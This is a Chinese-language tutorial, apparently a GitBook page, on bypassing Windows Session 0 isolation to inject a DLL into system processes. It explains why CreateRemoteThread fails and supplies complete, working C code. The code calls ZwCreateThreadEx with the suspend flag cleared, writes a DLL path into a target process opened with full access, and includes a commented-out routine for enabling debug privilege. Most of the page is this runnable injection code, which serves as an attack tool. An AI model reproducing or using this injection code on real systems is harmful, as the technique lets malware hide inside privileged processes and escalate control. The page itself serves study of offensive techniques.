# Bypass Session 0 Injection

## 简介

在使用传统的进程注入技术的过程中，可以向普通用户用户进程注入shellcode或dll，那么如果我们想更进一步注入到系统进程内，通常会失败，这是由于session 0隔离的缘故，接下来本文会介绍如何突破session 0隔离进行对系统进程的注入。

## ZwCreateThreadEx函数

通过调用CreateRemoteThread创建远程线程在NT内核6.0以前是没有什么问题，但在6.0以后引入了session隔离机制，在创建一个线程时先挂起，然后判断是否运行在所在会话层再决定是否恢复运行。

ZwCreateThreadEx函数比CreateRemoteThread函数更接近内核，CreateRemoteThread最终也是调用ZwCreateThreadEx函数来创建线程的，通过前人的研究发现，通过对CreateRemoteThread逆向研究发现，在内部调用ZwCreateThreadEx会把第七个参数创建标识设置为1，这样会使创建的线程挂起，这也是注入失败的原因。

所以如果想要创建的线程成功执行我们需要将第七个参数指定为0，这样我们就能在创建线程后让他执行。

ZwCreateThreadEx函数原型在不同位数的系统中有细微差别。

![](../.gitbook/assets/image%20%2820%29.png)

```text
#ifdef _WIN64
	typedef DWORD(WINAPI *typedef_ZwCreateThreadEx)(
		PHANDLE ThreadHandle,
		ACCESS_MASK DesiredAccess,
		LPVOID ObjectAttributes,
		HANDLE ProcessHandle,
		LPTHREAD_START_ROUTINE lpStartAddress,
		LPVOID lpParameter,
		ULONG CreateThreadFlags,
		SIZE_T ZeroBits,
		SIZE_T StackSize,
		SIZE_T MaximumStackSize,
		LPVOID pUnkown);
#else
	typedef DWORD(WINAPI *typedef_ZwCreateThreadEx)(
		PHANDLE ThreadHandle,
		ACCESS_MASK DesiredAccess,
		LPVOID ObjectAttributes,
		HANDLE ProcessHandle,
		LPTHREAD_START_ROUTINE lpStartAddress,
		LPVOID lpParameter,
		BOOL CreateSuspended,
		DWORD dwStackSize,
		DWORD dw1,
		DWORD dw2,
		LPVOID pUnkown);
#endif
```

## 代码实现

该注入技术与经典WriteProcessMemory，CreateRemoteThread注入技术非常相似，只是把创建进程的函数从CreateRemoteThread换成了ZwCreateThreadEx。

```text
#include <Windows.h>
#include <stdio.h>

#ifdef _WIN64
typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
	PHANDLE ThreadHandle,
	ACCESS_MASK DesiredAccess,
	LPVOID ObjectAttributes,
	HANDLE ProcessHandle,
	LPTHREAD_START_ROUTINE lpStartAddress,
	LPVOID lpParameter,
	ULONG CreateThreadFlags,
	SIZE_T ZeroBits,
	SIZE_T StackSize,
	SIZE_T MaximumStackSize,
	LPVOID pUnkown);
#else
typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
	PHANDLE ThreadHandle,
	ACCESS_MASK DesiredAccess,
	LPVOID ObjectAttributes,
	HANDLE ProcessHandle,
	LPTHREAD_START_ROUTINE lpStartAddress,
	LPVOID lpParameter,
	BOOL CreateSuspended,
	DWORD dwStackSize,
	DWORD dw1,
	DWORD dw2,
	LPVOID pUnkown);
#endif

typedef DWORD(WINAPI* typedef_LoadLibraryA)(char* path);
/*
BOOL EnbalePrivileges(HANDLE hProcess, char* pszPrivilegesName)
{
	HANDLE hToken = NULL;
	LUID luidValue = { 0 };
	TOKEN_PRIVILEGES tokenPrivileges = { 0 };
	BOOL bRet = FALSE;

	bRet = OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES, &hToken);

	bRet = LookupPrivilegeValue(NULL, pszPrivilegesName, &luidValue);

	tokenPrivileges.PrivilegeCount = 1;
	tokenPrivileges.Privileges[0].Luid = luidValue;
	tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	bRet = AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, 0, NULL, NULL);


	return TRUE;
}*/

int main(int argc, char* argv[]) {
	//EnbalePrivileges(GetCurrentProcess(), SE_DEBUG_NAME);

	char DllPath[] = "C:\\Users\\Black Sheep\\source\\repos\\sesion0\\x64\\Debug\\TestDll.dll";

	HANDLE hRemoteThread;

	HANDLE hNtModule = GetModuleHandleA("ntdll.dll");

	HANDLE hKeModule = GetModuleHandleA("Kernel32.dll");

	typedef_ZwCreateThreadEx ZwCreateThreadEx = GetProcAddress(hNtModule, "ZwCreateThreadEx");

	typedef_LoadLibraryA myLoadLibraryA = GetProcAddress(hKeModule, "LoadLibraryA");

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 1516);

	LPVOID lpBaseAddress = VirtualAllocEx(hProcess, NULL, sizeof(DllPath)+1, MEM_COMMIT, PAGE_READWRITE);

	WriteProcessMemory(hProcess, lpBaseAddress, DllPath, sizeof(DllPath), 0);

	ZwCreateThreadEx(&hRemoteThread, PROCESS_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)myLoadLibraryA, lpBaseAddress, 0, 0, 0, 0, NULL);

	CloseHandle(hRemoteThread);
	CloseHandle(hProcess);
	FreeLibrary(hKeModule);
	FreeLibrary(hNtModule);
	return 0;

}
```

![](../.gitbook/assets/image%20%283%29.png)

* github:[https://github.com/idiotc4t/sesion0](https://github.com/idiotc4t/sesion0)

## LINKS

《windows黑客编程》

{% embed url="https://kb.firedaemon.com/support/solutions/articles/4000086228-what-is-session-0-isolation-what-do-i-need-to-know-about-it-" %}



